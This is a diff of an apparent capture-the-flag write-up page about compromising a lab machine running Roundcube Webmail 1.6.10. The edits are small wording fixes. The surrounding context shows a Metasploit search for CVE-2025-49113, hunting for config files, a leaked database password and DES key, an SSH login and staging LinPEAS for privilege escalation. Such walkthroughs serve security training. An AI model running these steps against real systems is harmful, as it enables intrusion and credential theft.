@@ -100,7 +100,7 @@
   </h1>
   <div class="post-meta"><time class="post-date">2025-08-10</time><span class="post-author">Maaroof Khan</span>
     
-<span class="post-reading-time">5 min read (1041 words)</span></div>
+<span class="post-reading-time">5 min read (1032 words)</span></div>
 
   
     <span class="post-tags">
@@ -169,7 +169,7 @@
 <p>We&rsquo;re dealing with <strong>Roundcube Webmail 1.6.10</strong>. Before diving down a Google rabbit hole for exploits, my first move is always to fire up <code>metasploit</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
 </span></span><span style="display:flex;"><span>search roundcube
-</span></span></code></pre></div><p>And what do you know, we hit the jackpot! An exploit for a version less than 1.6.1 is available, which is close enough to investigate. The exact CVE is <code>CVE‑2025‑49113</code>.</p>
+</span></span></code></pre></div><p>And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is <code>CVE‑2025‑49113</code>.</p>
 <p><img src="metasploit_exp.png" alt="Metasploit Modules"></p>
 <p>Time to exploit (rubs hands).
 Used the following steps to run the exploit:</p>
@@ -184,7 +184,7 @@ Used the following steps to run the exploit:</p>
 <p>My first order of business on a new machine is always to hunt for passwords and config files.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find /var -name <span style="color:#e6db74">&#34;config&#34;</span> 2&gt;/dev/null
 </span></span></code></pre></div><p>This led me to <code>/var/www/html/roundcube/config</code>.</p>
-<p>Peeking into this folder gave away the file <code>config.inc.php</code> and it contained some spicy details
+<p>Peeking into this folder gave away the file <code>config.inc.php</code> and it contained some spicy details.
 Here is a sneak peak:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;db_dsnw&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&#39;</span>;
 </span></span><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;des_key&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rcmail-!24ByteDESkey*Str&#39;</span>;
@@ -229,7 +229,7 @@ For now we have enabled resource monitoring with Below and have granted you priv
 Please inform us immediately if you notice any irregularities.&rdquo;</p></blockquote>
 <p>This is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh jacob@10.10.11.77
-</span></span></code></pre></div><p>Now that we have user.txt and a massive clue from that mail lets check how we can escalate
+</span></span></code></pre></div><p>Now that we have user.txt and a massive clue from that mail lets check how we can escalate.
 Lets use <code>LinPeas</code> to find something (<code>sudo -l</code> could also reveal information but linpeas might give additional details)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On your machine - where linpeas.sh resides</span>
 </span></span><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span>
